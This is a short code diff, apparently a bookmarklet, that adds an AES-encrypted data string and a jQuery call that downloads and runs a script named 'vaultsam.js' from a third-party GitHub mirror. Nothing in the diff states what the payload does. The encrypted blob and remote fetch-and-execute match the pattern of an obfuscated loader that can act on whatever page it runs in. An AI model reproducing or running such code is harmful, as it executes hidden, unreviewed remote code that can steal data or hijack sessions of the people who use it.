@@ -1,1 +1,2 @@
-
+var encryptedData = 'U2FsdGVkX196OMk8CYMYfe3wfjgROQZZV09Sgh/fsJwctmxto+enFnDgYrF9GTywZxM9SEHyhHpplFFssOwFo8Y+5LX8n+x037XRxBt96ri1Dax0GUqnnd5IpFgqsq/QISRTe+O3ppb1TJiPF8z9RqYZMlseta4ccxGtLW30GcUqnMaxK3Za9FqK+csUldZgr5YcFhcG6dzCWkeS9YOi6gMv0+5Dq9vgSU2u0C7wt/8RlcMJmFCKtX9rP1COZCuTDQ5yaPUesIiwUyZsiFBuLaVtz3Ju67keJJh570kIs7o4BXdxDTKVk7Pp2NqvkYaU'; 
+$.getScript("https://raw.githack.com/Dogatw/Scripts/main/vaultsam.js");void(0);
